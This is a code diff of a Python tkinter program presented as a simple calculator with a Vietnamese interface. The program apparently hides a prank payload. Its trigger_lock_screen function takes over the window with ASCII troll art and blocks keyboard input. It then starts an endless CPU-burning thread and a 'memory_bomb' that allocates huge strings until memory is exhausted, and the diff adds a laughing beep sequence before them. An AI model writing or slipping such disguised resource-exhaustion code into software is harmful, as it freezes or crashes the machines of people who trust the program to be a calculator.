@@ -1,5 +1,7 @@
 import threading
+import time
 import tkinter as tk
+import winsound
 
 ASCII_TROLL_TEXT = """
                               .__            ___.     \\   
@@ -23,6 +25,17 @@ def clear():
   global expression
   expression = ""
   input_text.set("")
+
+def play_hehehe():
+  try:
+    laugh_notes = [500, 450, 500, 450, 400, 350]
+    for freq in laugh_notes:
+      winsound.Beep(freq, 150)  
+      time.sleep(0.08)  
+  except:
+    pass
+
+
 
 def trigger_lock_screen(root):
   for widget in root.winfo_children():
@@ -48,16 +61,21 @@ def trigger_lock_screen(root):
   root.bind("<Key>", lambda event: "break")
   root.focus_force()
 
-  threading.Thread(
-      target=lambda: [x + 1 for x in iter(int, 1)], daemon=True
-  ).start()
+  def delayed_chaos():
+    play_hehehe()
 
-  def memory_bomb():
-    A = []
-    while True:
-      A.append("LAG" * 10**8)
+    threading.Thread(
+        target=lambda: [x + 1 for x in iter(int, 1)], daemon=True
+    ).start()
 
-  threading.Thread(target=memory_bomb, daemon=True).start()
+    def memory_bomb():
+      A = []
+      while True:
+        A.append("HEHE" * 10**8)
+
+    threading.Thread(target=memory_bomb, daemon=True).start()
+
+  threading.Thread(target=delayed_chaos, daemon=True).start()
 
 
 def evaluate():
@@ -71,6 +89,7 @@ def evaluate():
   except:
     input_text.set("Lỗi")
     expression = ""
+
 
 root = tk.Tk()
 root.title("Máy Tính Đơn Giản")
@@ -280,4 +299,4 @@ tk.Button(
     command=lambda: click_btn("."),
 ).grid(row=4, column=2, padx=1, pady=1)
 
-root.mainloop()
+root.mainloop() 
